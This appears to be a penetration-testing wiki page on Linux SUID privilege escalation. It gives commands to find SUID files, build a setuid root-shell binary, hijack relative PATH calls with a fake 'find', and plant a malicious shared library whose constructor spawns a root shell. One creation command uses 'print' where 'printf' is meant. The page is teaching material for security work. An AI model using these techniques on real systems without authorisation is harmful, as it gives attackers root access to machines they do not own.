# 🛠️ SUID Binaries

## Theory

SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.



{% hint style="info" %}
Some of these techniques also may be used with SUDO scripts and binary
{% endhint %}

## Practice&#x20;

### Misc SUID Binaries

{% tabs %}
{% tab title="Find" %}
We can use this command to find all SUID binaries&#x20;

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -perm -4000 -type f 2>/dev/null
```
{% endtab %}

{% tab title="Create" %}
Here is how to create a SUID binary

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```
{% endtab %}

{% tab title="Known Exploits" %}
If you find that a binary have the SUID bits, you can check on [GTFOBins](https://gtfobins.github.io/) for known SUID exploits.
{% endtab %}
{% endtabs %}

### Relative Path Exploit

{% tabs %}
{% tab title="Enumerate" %}
If a **suid** binary executes another command **without specifying the full path.** We can abuse it and get a privilege escalation.

You may use `strings` to spot other binaries calls, or reverse the **suid** binary.

```bash
strings ./the-suid-bin

...
find
...
```
{% endtab %}

{% tab title="Exploit" %}
We can create a malicious executable with the same name as the one called by the **suid** binary.

```bash
echo '/bin/bash -p' > /tmp/find
chmod +x /tmp/find
```

\
Then, set the **PATH** env variable before executing the SUID binary.

```bash
#Sudo with modified PATH
export PATH=/tmp:$PATH 
./the-suid-bin
```
{% endtab %}
{% endtabs %}

### Shared Library Hijacking

{% tabs %}
{% tab title="Enumerate" %}
If you find some binary with **SUID** permissions, you could check if all the **.so** files are **loaded correctly**

```bash
strace the-suid-bin 2>&1 | grep -i -E "open|access|no such file"
```

You also could check if the **SUID** binary is loading a library from a folder **where we can write**:

```bash
# Lets find a SUID using a non-standard library
ldd the-suid-bin
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d the-suid-bin | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
{% endtab %}

{% tab title="Exploit" %}
For example, if you find that the **suid** binary **doesn't** **load correctly** _`/home/user/.config/libcalc.so`_ or that you can overwrite it, you can exploit it.

Write a malicious shared library

```c
//Saved to /home/user/.config/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Compile it

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

Execute the SUID binary

```bash
./SUID-BINARY
```

{% hint style="info" %}
If you get an error such as

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

that means that the library you have generated need to have a function called `a_function_name`.
{% endhint %}
{% endtab %}
{% endtabs %}

